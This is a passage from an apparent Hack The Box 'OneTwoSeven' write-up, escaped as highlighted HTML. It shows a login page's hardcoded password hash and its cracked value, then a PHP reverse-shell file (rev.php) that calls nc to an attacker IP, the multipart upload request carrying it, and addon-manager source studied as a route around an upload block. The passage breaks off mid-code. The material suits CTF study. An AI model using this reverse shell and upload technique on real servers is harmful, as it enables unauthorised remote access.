-    &amp;lt;p&amp;gt;&amp;amp;copy; 2019 OneTwoSeven, Dec. &amp;amp;middot; &amp;lt;a href=&quot;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&quot;&amp;gt;Privacy&amp;lt;/a&amp;gt; &amp;amp;middot; &amp;lt;a href=&quot;#&quot;&amp;gt;Terms&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
-&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;=&quot;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;float&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&amp;lt;a href=&quot;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&quot;&amp;gt;Back to top&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
-&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;footer&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;=&quot;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;container&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-  &amp;lt;!-- FOOTER --&amp;gt;
-  &amp;lt;/div&amp;gt;&amp;lt;!-- /.container --&amp;gt;
-    &amp;lt;!-- /END THE FEATURETTES --&amp;gt;
-    &amp;lt;hr class=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;featurette&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;divider&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-    &amp;lt;/div&amp;gt;
-	     &amp;lt;/div&amp;gt;
-         &amp;lt;/form&amp;gt;
-            &amp;lt;/table&amp;gt;
-              &amp;lt;tr&amp;gt;&amp;lt;td colspan=&quot;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;button type=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; name=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;Login&amp;lt;/button&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
-              &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Password:&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; name=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; size=&quot;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; required&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
-              &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Username:&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; name=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; size=&quot;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; required autofocus&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
-	    &amp;lt;table&amp;gt;
-            &amp;lt;h4 class = &quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;signin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;heading&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&amp;lt;font size=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; color=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;red&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&amp;lt;?php echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;; ?&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/h4&amp;gt;
-         &amp;lt;form action=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; method=&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-      
-      &amp;lt;div class = &quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;container&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
-      
-      &amp;lt;/div&amp;gt; &amp;lt;!-- /container --&amp;gt;
-         ?&amp;gt;
-            }
-              }
-                  &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = 'Wrong username or password.';
-              } else {
-		  header(&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;menu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;);
-                  &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION['username']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = 'ots-admin';
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; The credentials are hardcoded, however the password is hashed :&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ots-admin'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sha256'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; &lt;a href=&quot;https://crackstation.net/&quot;&gt;Crackstation&lt;/a&gt; was able to crack it :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/17.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;ots-admin : Homesweethome1&lt;/code&gt; :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/18.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/19.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; There’s a plugin upload form and some installed plugins above it, additionally there’s a small button to download the module’s &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; source from the directory &lt;code class=&quot;highlighter-rouge&quot;&gt;/addons&lt;/code&gt;:
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/20.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; If we can upload plugins then we got &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt;, the form submit button is disabled but we can easily change that :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/21.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/22.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/23.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/24.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;rev.php&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/25.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/26.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; It sent the request to &lt;code class=&quot;highlighter-rouge&quot;&gt;addon-upload.php&lt;/code&gt; and the response was 404.&lt;/p&gt;
-&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/addon-upload.php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;127.0.0.1:60080&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://127.0.0.1:60080/menu.php?addon=addons/ots-fs.php&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;multipart/form-data; boundary=---------------------------171386507112993851681929761040&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;326&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;PHPSESSID=ijo6tb6dnflvsm803pivm8dcd2&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
-
-
------------------------------171386507112993851681929761040
-
-Content-Disposition: form-data; name=&quot;addon&quot;; filename=&quot;rev.php&quot;
-Content-Type: application/x-php
-
-&amp;lt;?php
-system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f');
-?&amp;gt;
-
------------------------------171386507112993851681929761040--
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;  If we check the &lt;code class=&quot;highlighter-rouge&quot;&gt;Addon manager&lt;/code&gt; plugin we can see some interesting things :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/27.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; First thing is the rewrite rules, any request sent to &lt;code class=&quot;highlighter-rouge&quot;&gt;addon-upload.php&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;addon-download.php&lt;/code&gt; gets sent to &lt;code class=&quot;highlighter-rouge&quot;&gt;addons/ots-man-addon.php&lt;/code&gt;. There’s also a small note that says “Disabling a feature through htaccess leads to 404 errors for now.”, This explains why we got 404 when attempting to upload a plugin, however the download feature isn’t disabled and I was able to download the &lt;code class=&quot;highlighter-rouge&quot;&gt;Addon manager&lt;/code&gt; plugin :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/28.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; Since both requests to &lt;code class=&quot;highlighter-rouge&quot;&gt;addon-upload.php&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;addon-download.php&lt;/code&gt; go to &lt;code class=&quot;highlighter-rouge&quot;&gt;ots-man-addon.php&lt;/code&gt;, we have to find a way to exploit &lt;code class=&quot;highlighter-rouge&quot;&gt;ots-man-addon.php&lt;/code&gt; and just use &lt;code class=&quot;highlighter-rouge&quot;&gt;addon-download.php&lt;/code&gt; because it’s not disabled. 
-&lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;ots-man-addon.php&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location: /login.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'REQUEST_URI'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/addons/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;# OneTwoSeven Admin Plugin
-# OTS Addon Manager
-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;c1&quot;&gt;# Upload addon to addons folder.
-&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/\/addon-upload.php/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'REQUEST_URI'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'addon'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
-			&lt;span class=&quot;nv&quot;&gt;$errors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-			&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'addon'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
-			&lt;span class=&quot;nv&quot;&gt;$file_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'addon'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'size'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-			&lt;span class=&quot;nv&quot;&gt;$file_tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'addon'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'tmp_name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-
-			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-				&lt;span class=&quot;nv&quot;&gt;$errors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Module too big for addon manager. Please upload manually.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$errors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-				&lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-				&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location: /menu.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-				&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: text/plain&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-				&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;File uploaded successfull.y&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-				&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location: /menu.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-				&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: text/plain&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-				&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Error uploading the file: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-				&lt;span class=&quot;nb&quot;&gt;print_r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$errors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;c1&quot;&gt;# Download addon from addons folder.
-&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/\/addon-download.php/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'REQUEST_URI'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'addon'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-			&lt;span class=&quot;nv&quot;&gt;$addon_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'addon'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
